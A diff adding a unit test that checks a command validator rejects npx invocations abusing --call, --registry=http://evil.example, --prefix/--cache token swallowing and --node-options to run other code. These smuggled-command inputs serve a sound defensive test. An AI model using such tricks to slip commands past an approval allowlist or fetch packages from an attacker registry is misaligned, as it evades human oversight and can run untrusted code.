@@ -171,6 +171,21 @@ describe('isSelfToolCommand', () => {
     assert.ok(!isSelfToolCommand('npx --package=other-package bro'));
   });
 
+  test('rejects npx flags that change what runs or where it comes from', () => {
+    // --call runs a shell string; --registry picks the fetch source;
+    // --prefix/--cache consume the next token, so `bro` becomes a flag
+    // value and the real package is whatever follows it.
+    assert.ok(!isSelfToolCommand('npx --call=whoami bro'));
+    assert.ok(!isSelfToolCommand('npx --call "bro status" bro'));
+    assert.ok(!isSelfToolCommand('npx --registry=http://evil.example bro'));
+    assert.ok(!isSelfToolCommand('npx -y --prefix bro evil-pkg'));
+    assert.ok(!isSelfToolCommand('npx --cache bro eslint .'));
+    assert.ok(!isSelfToolCommand('npx --node-options=--inspect bro'));
+    // known no-value flags still pass
+    assert.ok(isSelfToolCommand('npx -y --yes --no-install -q bro status'));
+    assert.ok(isSelfToolCommand('npx --quiet @broject/bro act status'));
+  });
+
   test('does not approve lookalikes or other tools', () => {
     assert.ok(!isSelfToolCommand('brotli -d file'));
     assert.ok(!isSelfToolCommand('bdr foo'));
